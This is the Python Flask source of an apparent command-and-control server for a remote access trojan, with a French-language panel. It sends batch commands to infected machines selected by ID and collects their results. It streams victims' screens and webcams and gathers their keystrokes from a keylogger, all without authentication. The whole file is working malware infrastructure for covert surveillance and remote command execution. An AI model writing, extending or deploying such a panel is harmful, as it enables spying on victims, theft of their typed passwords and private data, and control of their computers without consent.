# app.py
from flask import (
    Flask, request, render_template_string,
    send_file, redirect, url_for, Response
)
import time

app = Flask(__name__)

# État global
commande = ""
resultat_commande = ""
destinataires = ""
mode = "cmd"        # "cmd", "live", "keys" ou "webcam"
last_host = ""      # hostname du dernier screen reçu
key_logs = ""       # journal des touches

# Template HTML
html_page = """
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Console, Live Screen & Keylogger & Webcam</title>
  <style>
    body { font-family: sans-serif; padding: 20px; }
    .section { margin-top: 30px; }
    #stream { max-width:90vw; border:1px solid #ccc; display:block; }
    pre { background:#f5f5f5; padding:10px; white-space: pre-wrap; }
    button { margin-right: 10px; }
  </style>
</head>
<body>
  <h1>🖥️ Contrôle à Distance v. IV</h1>

  <!-- Choix du mode -->
  <div class="section">
    <button onclick="location.href='{{ url_for('set_mode') }}?mode=cmd'" {% if mode=='cmd' %}disabled{% endif %}>⚪ Commande</button>
    <button onclick="location.href='{{ url_for('set_mode') }}?mode=live'" {% if mode=='live' %}disabled{% endif %}>🔴 Live</button>
    <button onclick="location.href='{{ url_for('set_mode') }}?mode=webcam'" {% if mode=='webcam' %}disabled{% endif %}>📷 Webcam</button>
    <button onclick="location.href='{{ url_for('set_mode') }}?mode=keys'" {% if mode=='keys' %}disabled{% endif %}>🗝️ Keylogger</button>
  </div>

  {% if mode == 'cmd' %}
  <div class="section">
    <h2>Envoyer une commande batch</h2>
    <form action="/" method="POST">
      <input type="text" name="commande" value="{{ commande }}" size="50" placeholder="Commande batch"><br><br>
      <label>Destinataires (* = tous, !ID pour exclure) :</label>
      <input type="text" name="destinataires" value="{{ destinataires }}"><br><br>
      <button type="submit">Envoyer</button>
    </form>
    <form action="/clear_output" method="POST" style="margin-top:10px;"><button type="submit">Effacer résultats</button></form>
    <h3>Résultat de la commande :</h3>
    <pre>{{ resultat_commande or "(vide)" }}</pre>
  </div>
  {% elif mode == 'live' %}
  <div class="section">
    <h2>Live Screen</h2>
    <p><strong>Hostname :</strong> {{ last_host or "(aucun)" }}</p>
    <img id="stream" src="/mjpeg" alt="Live screen">
  </div>
  {% elif mode == 'webcam' %}
  <div class="section">
    <h2>Webcam</h2>
    <p><strong>Hostname :</strong> {{ last_host or "(aucun)" }}</p>
    <img id="stream" src="/mjpeg" alt="Webcam stream">
  </div>
  {% elif mode == 'keys' %}
  <div class="section">
    <h2>Keylogger</h2>
    <form action="/clear_keys" method="POST" style="margin-bottom:10px;">
      <button type="submit">Effacer Key Logs</button>
    </form>
    <pre>{{ key_logs or "(aucun)" }}</pre>
  </div>
  {% endif %}
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def index():
    global commande, destinataires
    if request.method == "POST":
        commande = request.form.get("commande", "").strip()
        destinataires = request.form.get("destinataires", "").strip()
    return render_template_string(
        html_page,
        commande=commande,
        destinataires=destinataires,
        resultat_commande=resultat_commande,
        mode=mode,
        last_host=last_host,
        key_logs=key_logs
    )

@app.route("/set_mode")
def set_mode():
    global mode
    m = request.args.get("mode","")
    if m in ("cmd","live","keys","webcam"):
        mode = m
    return redirect(url_for("index"))

@app.route("/get_mode")
def get_mode():
    return mode

@app.route("/get_commande")
def get_commande():
    mid = request.args.get('id','')
    if not mid:
        return "", 400
    if destinataires == "*":
        return commande
    if destinataires.startswith("!"):
        excl = [i.strip() for i in destinataires[1:].split(",")]
        return commande if mid not in excl else ""
    incl = [i.strip() for i in destinataires.split(",")]
    return commande if mid in incl else ""

@app.route("/post_resultat", methods=["POST"])
def post_resultat():
    global resultat_commande
    mid = request.form.get("id"," ").strip()
    res = request.form.get("resultat","")
    resultat_commande += f"\n[{mid}]\n{res}\n"
    return "OK", 200

@app.route("/clear_output", methods=["POST"])
def clear_output():
    global resultat_commande
    resultat_commande = ""
    return redirect(url_for("index"))

@app.route("/post_screen", methods=["POST"])
def post_screen():
    global last_host
    f = request.files.get("screen")
    mid = request.form.get("id"," ").strip()
    if not f or not mid:
        return "Bad Request", 400
    f.save("latest.png")
    last_host = mid
    return "Image reçue", 200

@app.route("/post_keys", methods=["POST"])
def post_keys():
    global key_logs
    mid = request.form.get("id"," ").strip()
    keys = request.form.get("keys","")
    if mid and keys:
        key_logs += f"\n[{mid}]\n{keys}\n"
    return "OK", 200

@app.route("/clear_keys", methods=["POST"])
def clear_keys():
    global key_logs
    key_logs = ""
    return redirect(url_for("index"))

@app.route("/screen.png")
def screen_png():
    try:
        return send_file("latest.png", mimetype="image/png")
    except FileNotFoundError:
        return "", 404

def mjpeg_generator():
    boundary = b"--frame"
    while True:
        try:
            with open("latest.png","rb") as img:
                frame = img.read()
            yield boundary + b"\r\n" + \
                  b"Content-Type: image/png\r\n\r\n" + frame + b"\r\n"
        except FileNotFoundError:
            time.sleep(0.1)
            continue
        time.sleep(0.1)

@app.route("/mjpeg")
def mjpeg():
    return Response(
        mjpeg_generator(),
        mimetype="multipart/x-mixed-replace; boundary=frame"
    )

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, threaded=True)
